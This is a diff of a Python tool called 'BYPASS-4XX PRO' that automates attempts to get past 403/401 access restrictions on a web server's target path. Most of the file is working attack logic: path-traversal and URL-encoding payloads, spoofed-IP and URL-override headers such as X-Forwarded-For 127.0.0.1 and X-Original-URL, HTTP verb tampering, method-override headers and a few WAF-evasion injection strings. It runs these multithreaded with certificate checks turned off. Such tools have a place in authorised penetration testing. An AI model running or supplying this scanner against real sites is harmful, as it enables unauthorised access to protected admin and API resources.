@@ -1,111 +1,265 @@
+#!/usr/bin/env python3
+
 import requests
-from itertools import product
-import random
-from concurrent.futures import ThreadPoolExecutor
-from datetime import datetime
-from colorama import Fore, Style, init
 import argparse
 import pyfiglet
 import base64
+from itertools import product
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
+from colorama import Fore, Style, init
+from urllib.parse import urlparse, urlunparse
+from tqdm import tqdm
+import urllib3
 
-# Initialize color output
+# Suppress only the InsecureRequestWarning from urllib3 needed for verify=False
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Initialize colorama
 init(autoreset=True)
 
 
-# Print banner
-def print_banner():
-    banner = pyfiglet.figlet_format("BYPASS-4XX")
-    author = "By Ram"
-    print(Fore.RED + banner)
-    print(Fore.CYAN + author.center(50))
+class BypassRunner:
+    """
+    An advanced tool to test for 4xx and 3xx bypasses on web servers,
+    incorporating a wide range of techniques from various sources.
+    """
 
+    def __init__(self, args):
+        self.target_url = args.url.rstrip('/')
+        self.target_path = args.path.lstrip('/')
+        self.full_url = f"{self.target_url}/{self.target_path}"
+        self.parsed_url = urlparse(self.target_url)
+        self.log_file = args.output
+        self.threads = args.threads
+        self.timeout = args.timeout
+        self.verbose = args.verbose
 
-# Argument Parser
-parser = argparse.ArgumentParser(description="Advanced 4xx Bypass Tool")
-parser.add_argument("-of", "--outputfile", type=str, required=True, help="Specify output file name (e.g., results.txt)")
-args = parser.parse_args()
+        self.session = requests.Session()
+        self.session.verify = False  # Ignore SSL certificate verification
+        if args.proxy:
+            proxies = {'http': args.proxy, 'https': args.proxy}
+            self.session.proxies.update(proxies)
 
-# Input Target URL and Path
-url = input("Enter the target URL: ")
-target_path = input("Enter the target path (e.g., .htaccess, admin, etc.): ")
-full_url = f"{url.rstrip('/')}/{target_path.lstrip('/')}"
+        self.session.headers.update({'User-Agent': args.user_agent})
 
-# Headers List
-headers_list = [
-    {"Referer": "https://google.com"},
-    {"User-Agent": "Googlebot"},
-    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
-    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"},
-    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"},
-    {"X-Forwarded-For": "127.0.0.1"},
-    {"X-Forwarded-For": "192.168.1.1"},
-    {"X-Real-IP": "127.0.0.1"},
-    {"X-Originating-IP": "127.0.0.1"},
-    {"Authorization": "Basic dXNlcjpwYXNz"},
-    {"Authorization": "Bearer dummy_token"},
-    {"X-Original-URL": "/admin"},
-    {"X-Custom-IP-Authorization": "127.0.0.1"},
-    {"X-Rewrite-URL": "/admin"}
-]
+        self.successful_attempts = set()
+        self.pbar = None
 
-# HTTP Methods
-methods = ["GET", "HEAD", "OPTIONS", "TRACE", "PROPFIND", "POST", "DELETE", "PUT"]
+    def print_banner(self):
+        """Prints the tool's banner."""
+        banner = pyfiglet.figlet_format("BYPASS-4XX PRO")
+        author = "Ram"
+        print(Fore.RED + banner)
+        print(Fore.CYAN + author.center(60))
+        print("-" * 60)
+        print(f"{Fore.YELLOW}Target URL: {self.target_url}")
+        print(f"{Fore.YELLOW}Target Path: {self.target_path}")
+        print(f"{Fore.YELLOW}Threads: {self.threads}")
+        if self.log_file:
+            print(f"{Fore.YELLOW}Log File: {self.log_file}")
+        print("-" * 60)
 
-# Payloads for Bypass
-payloads = list(set([  # Remove duplicate payloads
-    "%2e", "%252e", "/..;/", "/;/", "/./.", "%00", "%2f", "%5c", "..%2f", "..%5c", "..;", "//", "~",
-    target_path.upper(), target_path.lower(), target_path.capitalize(),
-    f"{target_path}%00",
-    f"{target_path.encode('utf-8').hex()}",
-    base64.b64encode(target_path.encode()).decode()
-]))
+    def log_result(self, message, is_success=True):
+        """Logs a message to the console and file."""
+        # Use a tuple to check for uniqueness to avoid issues with unhashable dicts
+        log_key = message
+        if is_success:
+            if log_key in self.successful_attempts:
+                return
+            self.successful_attempts.add(log_key)
+            print(Fore.GREEN + Style.BRIGHT + message + Style.RESET_ALL)
+            if self.log_file:
+                with open(self.log_file, "a") as f:
+                    f.write(message + "\n")
+        elif self.verbose:
+            print(Fore.RED + message + Style.RESET_ALL)
 
-# Output File
-log_file = args.outputfile
-with open(log_file, "w") as f:
-    f.write("Bypass Testing Results\n\n")
+    def generate_payloads(self):
+        """Generates a comprehensive list of bypass payloads and techniques."""
+        path = self.target_path
 
-# Store unique successful attempts
-successful_attempts = set()
+        # Payloads from original Python script
+        base_payloads = [
+            f"/%2e/{path}", f"/{path}/.", f"//{path}//", f"/..;/{path}"
+        ]
 
+        # Payloads from bash script's URL_Encode_Bypass function
+        bash_payloads = [
+            f"/{path}#?", f"/{path}%09", f"/{path}%20", f"/{path}?", f"/{path}??", f"/{path}???",
+            f"/{path}//", f"/{path}/./", f"/{path}/*", f"/{path}.html", f"/{path}.json",
+            f"/{path}/..;/", f"/{path}..;/", f"/{path};/",
+            f"/{path}/%2e/", f"/{path}/%20/", f"/{path}/%2e%2e/",
+            f"/;{path}/",
+            # Path traversal and encoding
+            "/..%2f", "/..%5c", "/..%00/", "/..%0d/", "/..%ff/",
+            "/.", "/./", "/../", "/../../", "/../../../",
+            # Various encoded/special characters
+            "%2e", "..;", "%00", "%2f", "%5c", "~"
+        ]
 
-# Function to log successful bypass attempts
-def log_success(method, test_url, headers, payload, status):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    formatted_message = f"[{timestamp}] SUCCESS: {test_url} | Method: {method} | Status: {status} | Header: {headers} | Payload: {payload}"
+        all_payloads = list(set(base_payloads + bash_payloads))
+        return all_payloads
 
-    if test_url not in successful_attempts:
-        print(Fore.GREEN + formatted_message + Style.RESET_ALL)
-        with open(log_file, "a") as f:
-            f.write(formatted_message + "\n")
-        successful_attempts.add(test_url)
+    def generate_headers(self):
+        """Generates a list of headers to test for bypasses from the bash script."""
+        domain = self.parsed_url.hostname
+        headers = [
+            # IP Spoofing / Origin Headers
+            {"X-Originally-Forwarded-For": "127.0.0.1"},
+            {"X-Originating-IP": "127.0.0.1"},
+            {"X-Forwarded-For": "127.0.0.1"},
+            {"X-Remote-IP": "127.0.0.1"},
+            {"X-Client-IP": "127.0.0.1"},
+            {"X-Host": "127.0.0.1"},
+            {"X-ProxyUser-Ip": "127.0.0.1"},
+            {"True-Client-IP": "127.0.0.1"},
+            {"Client-IP": "127.0.0.1"},
+            {"X-Real-Ip": "127.0.0.1"},
+            {"X-Remote-Addr": "127.0.0.1"},
+            {"X-Forwarded-By": "127.0.0.1"},
+            {"X-Forwarded-For-Original": "127.0.0.1"},
+            {"X-Forwarder-For": "127.0.0.1"},
+            {"X-Original-Remote-Addr": "127.0.0.1"},
+            {"CF-Connecting-IP": "127.0.0.1"},
+            {"CF-Connecting_IP": "127.0.0.1"},  # Note the underscore
 
+            # Routing / URL Override Headers
+            {"X-Original-URL": f"/{self.target_path}"},
+            {"X-Rewrite-URL": f"/{self.target_path}"},
+            {"X-Forwarded-Host": "localhost"},
+            {"X-Forwarded-Server": "localhost"},
+            {"X-HTTP-DestinationURL": f"http://{domain}"},
+            {"X-HTTP-Host-Override": f"{domain}"},
+            {"Base-Url": f"http://{domain}"},
+            {"Http-Url": f"http://{domain}"},
+            {"Proxy-Host": f"http://{domain}"},
+            {"Proxy-Url": f"http://{domain}"},
+            {"Real-Ip": f"http://{domain}"},  # Sometimes used for routing
+            {"Redirect": f"http://{domain}"},
+            {"Request-Uri": f"http://{domain}"},
+            {"Uri": f"http://{domain}"},
+            {"Url": f"http://{domain}"},
 
-# Function to send request and test for bypass
-def test_request(method, test_url, headers, payload):
-    try:
-        response = requests.request(method, test_url, headers=headers, allow_redirects=False)
-        status = response.status_code
+            # Protocol and Port Override
+            {"X-Forwarded-Proto": "http"},
+            {"X-Forwarded-Scheme": "http"},
+            {"X-Forwarded-Scheme": "https"},
+            {"X-Forwarded-Port": "80"},
+            {"X-Forwarded-Port": "443"},
+            {"X-Forwarded-Port": "8080"},
+            {"X-Forwarded-Port": "8443"},
 
-        if status in [200, 201, 202, 204, 302]:  # Successful bypass status codes
-            log_success(method, test_url, headers, payload, status)
-        else:
-            print(Fore.RED + f"FAILED: {test_url} | Method: {method} | Status: {status}" + Style.RESET_ALL)
-    except requests.exceptions.RequestException:
-        print(Fore.YELLOW + f"ERROR: Could not connect to {test_url}" + Style.RESET_ALL)
+            # Other Headers
+            {"Referer": f"{self.target_url}"},
+            {"Referrer": f"{self.target_url}"},  # Common misspelling
+            {"Content-Length": "0"},
+        ]
+        return headers
 
+    def test_request(self, method, url, headers=None, payload_info=""):
+        """Sends a single request and checks the response."""
+        try:
+            effective_headers = self.session.headers.copy()
+            if headers:
+                effective_headers.update(headers)
 
-# Main function to perform testing
-def test_bypass():
-    print_banner()
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        for method, headers in product(methods, headers_list):
-            headers = random.choice(headers_list)  # Randomize headers for each request
-            for payload in payloads:
-                test_url = f"{full_url}{payload}"
-                executor.submit(test_request, method, test_url, headers, payload)
+            response = self.session.request(method, url, headers=effective_headers, timeout=self.timeout,
+                                            allow_redirects=False)
+            status = response.status_code
+
+            if 200 <= status < 400:
+                msg = (f"[{datetime.now().strftime('%H:%M:%S')}] SUCCESS ({status}) | "
+                       f"URL: {url} | METHOD: {method} | "
+                       f"HEADERS: {headers or 'Default'} | {payload_info}")
+                self.log_result(msg, is_success=True)
+            else:
+                msg = f"FAILED ({status}) | URL: {url} | METHOD: {method}"
+                self.log_result(msg, is_success=False)
+
+        except requests.exceptions.RequestException as e:
+            msg = f"ERROR | URL: {url} | Could not connect: {e}"
+            self.log_result(msg, is_success=False)
+        finally:
+            if self.pbar:
+                self.pbar.update(1)
+
+    def run(self):
+        """Main function to orchestrate the bypass testing."""
+        self.print_banner()
+
+        if self.log_file:
+            with open(self.log_file, "w") as f:
+                f.write(f"Bypass Testing Results for {self.full_url}\n\n")
+
+        # Expanded methods from bash script
+        methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH", "TRACE", "LOCK", "UPDATE", "TRACK"]
+        payloads = self.generate_payloads()
+        headers_to_test = self.generate_headers()
+
+        # Payloads for specific WAF bypass from bash script
+        waf_payloads = [
+            "/'%20or%201.e(%22)%3D'",
+            "/1.e(ascii",
+            "/1.e(substring("
+        ]
+
+        tasks = []
+
+        # Strategy 1: Test various HTTP methods
+        for method in methods:
+            tasks.append({'method': method, 'url': self.full_url, 'payload_info': "Method Test"})
+
+        # Strategy 2: Test URL path payloads with GET
+        for payload in payloads:
+            test_url = f"{self.target_url}{payload}"
+            tasks.append({'method': "GET", 'url': test_url, 'payload_info': f"Path Payload: {payload}"})
+
+        # Strategy 3: Test header injections with GET
+        for header in headers_to_test:
+            tasks.append({'method': "GET", 'url': self.full_url, 'headers': header, 'payload_info': "Header Injection"})
+
+        # Strategy 4: Test method override with POST
+        for method_override in ["GET", "PUT", "DELETE"]:
+            override_headers = {"X-HTTP-Method-Override": method_override}
+            tasks.append({'method': 'POST', 'url': self.full_url, 'headers': override_headers,
+                          'payload_info': f"Method Override"})
+
+        # Strategy 5: Test for specific WAF bypasses
+        for payload in waf_payloads:
+            test_url = f"{self.full_url}{payload}"
+            tasks.append({'method': 'GET', 'url': test_url, 'payload_info': f"WAF Payload: {payload}"})
+
+        # Initialize progress bar
+        self.pbar = tqdm(total=len(tasks), desc="Testing Payloads", unit="req", ncols=100)
+
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            for task in tasks:
+                executor.submit(self.test_request, task['method'], task['url'], task.get('headers'),
+                                task.get('payload_info', ''))
+
+        self.pbar.close()
+        print(f"\n{Fore.CYAN}Scan complete. {len(self.successful_attempts)} potential bypasses found.")
+        if self.log_file:
+            print(f"{Fore.GREEN}Results saved to {self.log_file}{Style.RESET_ALL}")
 
 
 if __name__ == "__main__":
-    test_bypass()
-    print(f"{Fore.GREEN}Results saved to {log_file}{Style.RESET_ALL}")
+    parser = argparse.ArgumentParser(
+        description="Advanced 4xx/3xx Bypass Tool with integrated techniques from multiple sources.",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+    parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g., https://example.com)")
+    parser.add_argument("-p", "--path", type=str, required=True,
+                        help="Target path to test (e.g., /admin, /api/v1/users)")
+    parser.add_argument("-o", "--output", type=str, help="Specify output file name to save results (e.g., results.txt)")
+    parser.add_argument("-t", "--threads", type=int, default=30, help="Number of concurrent threads (default: 30)")
+    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
+    parser.add_argument("--proxy", type=str, help="Proxy server to use (e.g., http://127.0.0.1:8080)")
+    parser.add_argument("-ua", "--user-agent", type=str, default="Bypass-Tool-Pro/3.0", help="Custom User-Agent string")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Show failed attempts in output")
+
+    args = parser.parse_args()
+
+    runner = BypassRunner(args)
+    runner.run()
